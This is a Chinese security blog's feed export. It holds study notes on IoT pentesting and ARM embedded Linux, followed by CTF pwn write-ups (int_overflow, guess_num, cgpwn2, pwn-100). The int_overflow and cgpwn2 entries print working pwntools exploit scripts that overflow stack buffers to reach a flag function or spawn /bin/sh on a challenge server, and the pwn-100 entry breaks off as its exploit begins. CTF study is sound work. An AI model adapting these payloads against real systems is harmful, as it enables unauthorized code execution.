  </entry>
  
  <entry>
    <title>《物联网渗透测试》学习笔记1</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</id>
    <published>2022-08-09T03:24:06.948Z</published>
    <updated>2020-10-09T08:13:24.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-IOT渗透测试"><a href="#0x01-IOT渗透测试" class="headerlink" title="0x01 IOT渗透测试"></a>0x01 IOT渗透测试</h1><p>定义IoT生态系统与渗透测试生命周期</p><ul><li>渗透测试方法：<ul><li>黑盒测试</li><li>白盒测试</li><li>灰盒测试</li></ul></li></ul><h2 id="固件入门"><a href="#固件入门" class="headerlink" title="固件入门"></a>固件入门</h2><p>固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。</p><p>固件通常由bootloader、内核、文件系统以及其他资源组成，</p><p>固件组成：闪存、bootloader、内核、根文件系统。</p><ul><li>bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。</li><li>固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。</li></ul><h2 id="IoT中的Web应用"><a href="#IoT中的Web应用" class="headerlink" title="IoT中的Web应用"></a>IoT中的Web应用</h2><p>通常嵌入书web应用被设计为在自包含的环境中运行</p><ul><li>目前iot领域主要有两种不同的web应用模型<ul><li>混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。</li><li>独立嵌入式服务器模型</li></ul></li></ul><p>web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。</p><h2 id="硬件设备基础"><a href="#硬件设备基础" class="headerlink" title="硬件设备基础"></a>硬件设备基础</h2><p>硬件输入：</p><ul><li>EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。</li><li>NAND闪存以区块为单位读写。存储设备的boootloader。</li><li>UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。</li><li>JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口）</li></ul><h2 id="IoT无线通信简介"><a href="#IoT无线通信简介" class="headerlink" title="IoT无线通信简介"></a>IoT无线通信简介</h2><p>最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。</p><h1 id="IoT威胁建模"><a href="#IoT威胁建模" class="headerlink" title="IoT威胁建模"></a>IoT威胁建模</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-IOT渗透测试&quot;&gt;&lt;a href=&quot;#0x01-IOT渗透测试&quot; class=&quot;headerlink&quot; title=&quot;0x01 IOT渗透测试&quot;&gt;&lt;/a&gt;0x01 IOT渗透测试&lt;/h1&gt;&lt;p&gt;定义IoT生态系统与渗透测试生命周期&lt;/p&gt;
&lt;ul&gt;
&lt;l</summary>
      
    
    
    
    
    <category term="IOT 《物联网渗透测试》" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/"/>
    
  </entry>
  
  <entry>
    <title>《ARM嵌入式Linux系统开发详解》学习笔记1</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</id>
    <published>2022-08-09T03:21:41.844Z</published>
    <updated>2022-08-09T03:22:14.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-嵌入式系统入门"><a href="#0x01-嵌入式系统入门" class="headerlink" title="0x01 嵌入式系统入门"></a>0x01 嵌入式系统入门</h1><p><b>什么是嵌入式系统：</b></p><p>一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。</p><p><b>嵌入式微控制器：</b></p><p>嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。</p><p>通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。</p><p><b>嵌入式微处理器：</b></p><p>单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。</p><p><b>典型嵌入式系统组成：</b></p><p>嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。</p><p>嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。</p><p>典型嵌入式系统:</p><ul><li>硬件：<ul><li>嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号</li><li>外部设备：在不同系统中有不同选择。</li></ul></li><li>软件：<ul><li>嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。</li><li>应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。</li></ul></li></ul><h1 id="0x02-嵌入式软硬件系统"><a href="#0x02-嵌入式软硬件系统" class="headerlink" title="0x02 嵌入式软硬件系统"></a>0x02 嵌入式软硬件系统</h1><p>数字电路是计算机的基础。</p><p>进制转换</p><p>计算机组成原理</p><p>直接内存访问：DMA</p><p>软件：系统软件、应用软件</p><p>软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。</p><p>常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。</p><p>操作系统的基本结构都是内核、驱动程序、程序库。</p><h1 id="0x03-ARM处理器"><a href="#0x03-ARM处理器" class="headerlink" title="0x03 ARM处理器"></a>0x03 ARM处理器</h1><ul><li>微处理器<ul><li>通用微处理器：用于高性能计算</li><li>嵌入式微处理器：针对某种特定应用的高能力计算</li><li>微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。</li></ul></li></ul><p>ARM:高性能RISC机器。</p><ul><li>芯片体积小，功耗低，成本低性能优异</li><li>支持Thumb(16位)和ARM(32位)</li><li>内部大量使用寄存器，执行指令速度快。</li><li>大部分指令是操作寄存器，很少访问外部内存</li><li>采用多级流水线结构处理速度快。</li><li>多种寻址方式，数据存取方式灵活</li><li>指令长度固定，便于编译器操作以及执行指令</li></ul><h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><ul><li>算术运算指令<ul><li>ADD:加法运算<ul><li>add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2</li></ul></li><li>ADC:带进位加法<ul><li>ADC dest,op1,op2</li></ul></li><li>SUB:减法<ul><li>sub dest,op1,op2</li><li>dest=op1-op2</li></ul></li><li>SBC：带进位减法</li></ul></li><li>逻辑运算指令<ul><li>AND:逻辑与(1 1为1，0 0为1，1 0为0)<ul><li>and dest,op1,op2</li><li>dest=op1 and op2</li></ul></li><li>EOR:异或（1 1为0，0 0为0，10为1）</li><li>MOV:复制数据<ul><li>mov dest,op1</li><li>dest=op1</li><li>mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8</li></ul></li></ul></li><li>分支指令<ul><li>B:跳转<ul><li>b 地址 //跳转到指定地址</li></ul></li></ul></li><li>数据传送指令<ul><li>单一数据传送指令：向内存装载和存储一个字节或一个字长的数据<ul><li>LDR Rd,地址</li><li>STR Rd,地址</li><li>LDR B Rd,地址</li><li>STR B Rd,地址</li></ul></li><li>多数据传送指令：向内存装载和存储多个字节或字的数据<ul><li>xxM Rn(!),&lt;寄存器列表&gt;{^}</li><li>xx:LD–装载，ST–存储</li><li>LDMED LDMIB//++i</li><li>LDMFD LDMIA//i++</li><li>LDMEA LDMDB//++*i</li><li>LDMFA LDMDA//*i++</li><li>STMFA STMIB//存储前增加地址</li><li>STMEA STMIA//存储后增加地址</li><li>STMFD STMDB//存储前增加值</li><li>STMED STMDA//存储后增加值</li></ul></li></ul></li></ul><p>ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。</p><p>MMU:内存管理单元。</p><blockquote><p>LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）<br>LSR:逻辑右移，二进制从左往右，空位补0<br>ASR:算术右移，符号位不变，高位空出补0，低位补1<br>ROR:循环右移，低位移到高位<br>RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充</p></blockquote><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ul><li>立即寻址:用#表示数值<ul><li>subs r0,#1;r0=r0-1</li><li>mov r0,#0xff00;r0=0xff00</li></ul></li><li>寄存器寻址方式：读取寄存器得到操作数<ul><li>mov r1,r2;r1=r2</li><li>sub r0,r1,r2;r0=r1-r2</li></ul></li><li>寄存器偏移寻址：寄存器的值移位得结果<ul><li>mov r0,r1,LSL #3;r0=r1*8</li><li>ands r0,r2,LSL #3;r0= r2*8 and r1</li></ul></li><li>寄存器间接寻址：寄存器为地址，从对应内存重取出数据<ul><li>LDR r0,[r1];r1为地址，从内存中取出数据存入r0</li><li>SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换</li></ul></li><li>基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据<ul><li>LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址</li><li>STR r0,[r1,#-2];r1数值-2得到数据地址</li></ul></li><li>多寄存器寻址：一次传输多个寄存器值<ul><li>LDMIA r1!,{r2<del>r7,r12};r1单元重数据读到r2</del>r7和r12,r1指定地址自动加1</li></ul></li><li>栈寻址：先进后出，通过栈指针寄存器寻址<ul><li>STMFD SP!,{R0<del>R7,LR};r0</del>r7和LR的内容压入堆栈</li><li>LDMFD SP!,{r0<del>r7,LR};从堆栈中取出数据到r0</del>r7和LR</li></ul></li></ul><h1 id="0x04-嵌入式Linux"><a href="#0x04-嵌入式Linux" class="headerlink" title="0x04 嵌入式Linux"></a>0x04 嵌入式Linux</h1><p>一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。</p><h1 id="0x05-建立软件开发环境"><a href="#0x05-建立软件开发环境" class="headerlink" title="0x05 建立软件开发环境"></a>0x05 建立软件开发环境</h1><ul><li>运行在windows平台下得到Linux系统模拟环境：Cygwin.</li><li>linux下：串口工具minicom</li><li>windows下：串口工具xshell</li><li>ARM集成开发环境ADS<ul><li>c语言编译器armcc</li><li>c++语言编译器armcpp</li></ul></li></ul><h1 id="0x06-第一个linux应用程序"><a href="#0x06-第一个linux应用程序" class="headerlink" title="0x06 第一个linux应用程序"></a>0x06 第一个linux应用程序</h1><ul><li>vi创建源代码文件hello.c</li><li>gcc -c hello.c 编译运行</li></ul><h1 id="0x07-Linux应用程序编程基础"><a href="#0x07-Linux应用程序编程基础" class="headerlink" title="0x07 Linux应用程序编程基础"></a>0x07 Linux应用程序编程基础</h1><ul><li>堆栈</li><li>内存管理函数<ul><li>malloc():分配内存，不能初始化内存空间</li><li>free()：释放malloc()分配的内存</li></ul></li><li>实用的内存分配函数<ul><li>calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间</li><li>realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。</li></ul></li><li>文件指针和流：FILE*fp</li><li>getc() /fgetc() /getchar()</li><li>POSIX文件I/O编程<ul><li>POSIX可移植操作系统接口</li><li>open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性</li><li>文件头：<ul><li>&lt;sys/types.h&gt;</li><li>&lt;sys/stat.h&gt;</li><li>&lt;fcntl.h&gt;</li></ul></li></ul></li></ul><h1 id="0x08-开发多进程-x2F-线程程序"><a href="#0x08-开发多进程-x2F-线程程序" class="headerlink" title="0x08 开发多进程/线程程序"></a>0x08 开发多进程/线程程序</h1><ul><li>PCB进程控制块</li><li>fork()调用创建进程</li><li>退出进程：exit()、_exit()、atexit()、on_exit().</li><li>常用进程间通信方法：<ul><li>管道：单方向传送数据，只能在有共同父进程的进程间使用<ul><li>pipe()函数：创建管道</li><li>#include&lt;unistd.h&gt; int pipe(int filedes[1]);</li></ul></li><li>共享内存：不同进程可访问<ul><li>int shmget():创建</li><li>void *shmat：获得一个共享内存ID对应的内存其实地址</li><li>int shmdt：从程序中分立一块共享内存</li></ul></li><li>FIFO</li><li>消息队列</li><li>信号量</li><li>共享存储</li><li>socker</li></ul></li><li>Linux的多进程和多线程</li></ul><h1 id="0x09-网络通信应用"><a href="#0x09-网络通信应用" class="headerlink" title="0x09 网络通信应用"></a>0x09 网络通信应用</h1><ul><li>TCP/IP协议簇</li></ul><p><img src="https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png" alt="捕获.PNG"></p><ul><li>IP协议：在传输层，负责数据包的传输管理<ul><li>实现两个功能：寻址和分段</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-嵌入式系统入门&quot;&gt;&lt;a href=&quot;#0x01-嵌入式系统入门&quot; class=&quot;headerlink&quot; title=&quot;0x01 嵌入式系统入门&quot;&gt;&lt;/a&gt;0x01 嵌入式系统入门&lt;/h1&gt;&lt;p&gt;&lt;b&gt;什么是嵌入式系统：&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;一种为特定设</summary>
      
    
    
    
    
    <category term="学习笔记" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 int_overflow</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/</id>
    <published>2022-08-09T03:17:04.192Z</published>
    <updated>2020-09-10T07:29:14.007Z</updated>
    
    <content type="html"><![CDATA[<h3 id="checksec-查看保护机制"><a href="#checksec-查看保护机制" class="headerlink" title="checksec 查看保护机制"></a>checksec 查看保护机制</h3><p><img src="https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png" alt="捕获.PNG"></p><p>可直接使用栈溢出；基地址不变化；栈中数据有执行权限；</p><h3 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h3><p>32位文件，按流程查看程序，main()无突破点。</p><p>进入login(),限制username长度最大0x19;限制passwd长度最大0x199；</p><p>进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。</p><blockquote><p>此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。</p></blockquote><p>综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit）</p><p>溢出之后到达else语句，函数返回  strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。</p><p><img src="https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png" alt="17627983-0f96bbadb310adc5.png"></p><p>在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B.</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。</p><p>在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言：</p><p><img src="https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png" alt="17627983-255df211907024ca.png"></p><p><img src="https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png" alt="17627983-73596713043662d6.png"></p><p>在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：<strong>在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。</strong>随机选取数值262.<br>（what_is_this()函数的地址为4字节）</p><p>262-0x14-4-4=234</p><p>或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。</p><p><img src="https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png" alt="捕获.PNG"></p><p>exp:</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import*<br><span class="hljs-keyword">sh</span>=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">39118</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'Your choice:'</span>)<br>flag=<span class="hljs-number">0</span>x0804868B<br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">'1'</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'username:'</span>)<br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">'z'</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'passwd:'</span>)<br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x14+<span class="hljs-string">'aaaa'</span>+p32(flag)+<span class="hljs-string">'a'</span>*<span class="hljs-number">234</span><br><span class="hljs-keyword">sh</span>.sendline(payload)<br><span class="hljs-keyword">sh</span>.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;checksec-查看保护机制&quot;&gt;&lt;a href=&quot;#checksec-查看保护机制&quot; class=&quot;headerlink&quot; title=&quot;checksec 查看保护机制&quot;&gt;&lt;/a&gt;checksec 查看保护机制&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 guess_num</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/</id>
    <published>2022-08-09T03:17:04.190Z</published>
    <updated>2020-09-10T07:29:14.001Z</updated>
    
    <content type="html"><![CDATA[<p>查看关键main()函数，发现gets(&amp;v11)存在栈溢出</p><p><img src="https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png" alt="17627983-c6ff7c8db83a9ec7.png"></p><p>进入sub_C3E()函数，确定满足条件即可cat flag。</p><p><img src="https://i.loli.net/2020/05/08/QgLDtJBZlhXYyFa.png" alt="17627983-1e961fbba4dff1bc.png"></p><p>题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。</p><blockquote><p>注：<br>（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.<br>（2）libc共享库：可以使用命令 ldd guess_num 查找<br>（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary(‘’)<br>(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。</p></blockquote><p>exp:</p><p><img src="https://i.loli.net/2020/05/08/hltLr1UKMu6qmcG.png" alt="17627983-82da413e439821bd.png"></p><blockquote><p>解释：<br>引入pwn、ctypes模块；<br>remote连接其他主机服务；<br>elf=ELF(bin路径)本地运行pwn文件；<br>libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；<br>recvuntil()接收字符串；<br>sendline(payload)发送payload；<br>srand(1)设定随机数种子为1；<br>循环十次；<br>interactive()直接进行交互；</p></blockquote><p><img src="https://i.loli.net/2020/05/08/UXbv96WNxFriu3k.png" alt="17627983-caa9a4e5b8ce9f1a.png"></p><p>另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag.</p><p><img src="https://i.loli.net/2020/05/08/LoDke3q2xhGSPHU.png" alt="17627983-93fb0ad7c552854b.png"></p><p><img src="https://s1.ax1x.com/2020/05/08/YnNVrd.png" alt="YnNVrd.png"></p><p><img src="https://s1.ax1x.com/2020/05/08/YnNMPf.png" alt="YnNMPf.png"></p><p>cyberpeace{c89cf2a54c56f16458a1164851a361b4}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;查看关键main()函数，发现gets(&amp;amp;v11)存在栈溢出&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png&quot; alt=&quot;17627983-c6ff7c8db83a9ec7.png</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 cgpwn2</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/</id>
    <published>2022-08-09T03:17:04.188Z</published>
    <updated>2020-09-10T07:29:13.987Z</updated>
    
    <content type="html"><![CDATA[<p>算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。</p><p>name是全局变量，在bss区段，适合写入。</p><p>pwn()函数中调用了__system，但并没有‘/bin/sh’</p><p><img src="https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png" alt="17627983-d0f4027f425eadcd.png"></p><p><img src="https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png" alt="17627983-8f37fec1f7e9fab3.png"></p><p><img src="https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png" alt="17627983-a19abf21a8c9c0f7.png"></p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。</p><p>payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’)</p><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> # p = process(<span class="hljs-string">'./cgpwn2'</span>)<br>p = remote(<span class="hljs-string">"111.198.29.45"</span>,<span class="hljs-number">32966</span>)<br>system_addr = <span class="hljs-number">0x804855A</span><br>bss_addr = <span class="hljs-number">0x804A080</span><br>p.recvuntil(<span class="hljs-string">'name\n'</span>)<br>p.sendline(<span class="hljs-string">"/bin/sh\x00"</span>)<br>p.recvuntil(<span class="hljs-string">'here:\n'</span>)<br>payload = <span class="hljs-number">0x26</span>*<span class="hljs-string">'a'</span> +<span class="hljs-string">'bbbb'</span>+ p32(system_addr) + p32(bss_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;算是简单题，进入hello()函数中发现gets(&amp;amp;s) 栈溢出漏洞。&lt;/p&gt;
&lt;p&gt;name是全局变量，在bss区段，适合写入。&lt;/p&gt;
&lt;p&gt;pwn()函数中调用了__system，但并没有‘/bin/sh’&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界pwn-100</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/</id>
    <published>2022-08-09T03:17:04.186Z</published>
    <updated>2022-08-09T03:51:37.530Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查壳：checksec</p><p><img src="https://i.loli.net/2020/05/31/mfOTnUiRdaMHtGE.png" alt="查壳.PNG"></p><p>64位，无stack,无PIE；</p><p><img src="https://i.loli.net/2020/05/31/sHDG4fSe6xELluo.png" alt="1.PNG"></p><p>运行程序，输入字符，无反馈，无限制。</p><p><img src="https://i.loli.net/2020/05/31/axJ5bmchdIwRsfM.png" alt="漏洞.PNG"></p><p><img src="https://i.loli.net/2020/05/31/VCymAtHUqB7Pbei.png" alt="漏洞2.PNG"></p><p>ida查看main函数，发现存在栈溢出，参数a1大小为0x40.然而函数中获取大于等于a2（a2=200）的数值存入了a1.</p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>无system函数，无/bin/sh字符串，有read,puts。参数经过寄存器传递（也可IDA查看），可以泄露libc,写入/bin/sh。</p><p><img src="https://i.loli.net/2020/05/31/wnf1YmoagvHcM2k.png" alt="寄存器传参.PNG"></p><p><img src="https://i.loli.net/2020/05/31/CrYc9oJgkWzthG2.png" alt="IDA查看寄存器.PNG"></p><p>puts只需要一个参数。寄存器rdi存放写入地址，rsi存放写入字节数。找到pop rdi;ret传参，即</p><p><code>pop rdi; ret</code><br><code>pop rsi; pop r15; ret</code></p><p><img src="https://i.loli.net/2020/05/31/c1NEeWTBvPy4OXj.png" alt="通过pop控制写入.PNG"></p><blockquote><p>注：调用read函数时，x86中参数直接放入栈中；x64设立了几个寄存器存放参数，调用函数时先向寄存器中放参数，当参数数量大于寄存器，才会像栈中放参数<br>传参顺序默认从后先开始传入。x86 x64一样。</p></blockquote><p>此处需要学习利用寄存器传递参数。</p><blockquote><p>关于pwntools的DynELF，主要功能是通过不断传入默认的函数地址到自己写的leak函数内部，测试并获取libc版本，得到函数地址。又因为DynELF无法搜索字符串地址，所以我们需要传入所需字符串，在调用函数加载bash。</p></blockquote><p>由于需要不断传参测试，加载程序后libc地址都会变化，可以重置程序解决问题。</p><p>初始化之后相当于一个新的程序，栈空间从新分配。此程序初始化段：</p><p><img src="https://i.loli.net/2020/05/31/EDtReszWUadf94H.png" alt="初始化.PNG"></p><blockquote><p>程序还需调用一个gadget,后续另起一篇学习</p></blockquote><p><img src="https://i.loli.net/2020/05/31/Kkm4sFIlzySxPZt.png" alt="gadget.PNG"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 